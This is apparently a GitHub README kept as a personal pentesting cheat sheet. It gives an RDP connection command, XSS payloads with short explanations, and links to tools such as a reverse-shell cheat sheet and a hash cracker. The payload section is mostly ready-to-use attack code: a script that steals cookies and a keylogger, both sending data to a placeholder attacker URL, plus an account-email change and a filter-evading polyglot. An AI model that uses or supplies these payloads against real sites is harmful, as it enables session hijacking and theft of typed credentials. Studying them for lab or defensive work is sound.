# pentesting_time
<h1>My pentesting cheat sheet, where I share "hotkey" tools and the same things.</h1>
There is a :
<ol>
  <li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/network_tools'>network tools</a>
  <li> <a href='#n1'>command examples</a>
  <li> <a href='README.md#n2'>payloads</a>
  <li> <a href='README.md#n3'>helpful sites</a>
  <!--<li> cheat sheet injections
  <li> tools like gitlab hash identify
  <li> shells!-->
</ol>

<h2 id='n1'>Commands</h2> 
<h3>Remote Desktop Protocol (rdp)</h3>
  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:User /p:'Password'

<h2 if='n2'>Payloads</h2>
    <h3>XSS Payloads</h3>
    <li> <b>Proof Of Concept (PoC)</b> - <script>alert('Success XSS');</script>
      <p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
    <li> <b>Session Srealing</b> - <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script>
      <p>Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
    <li> <b>Key Logger</b> - <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script>
      <p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
    <li> <b>Business Logic</b> -  <script>user.changeEmail('your@email.com');</script>
      <p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
    <li><b>Polyglots</b> - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
      <p>An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
        
<h2 id='n3'>Sites</h2>
      <li> <a href='https://crackstation.net/'>crackstation.net</a> - online password hash cracker
      <li> <a href='https://www.base64encode.org/'>Base64</a> encode/decode
      <li> <a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'>Reverse Shell Cheat Sheet</a>
      <li> <a href='https://hashes.com/en/tools/hash_identifier'>Identify hash types</a>
      <li> <a href='https://devhints.io/bash'>Bash scripting</a> cheat sheet
      <li> <a href='https://gchq.github.io/CyberChef/'>CyberChef</a> - encode/decode service
      <li> <a href='https://www.kirsle.net/wizards/flask-session.cgi'>Flask Session Cookie Decoder</a>
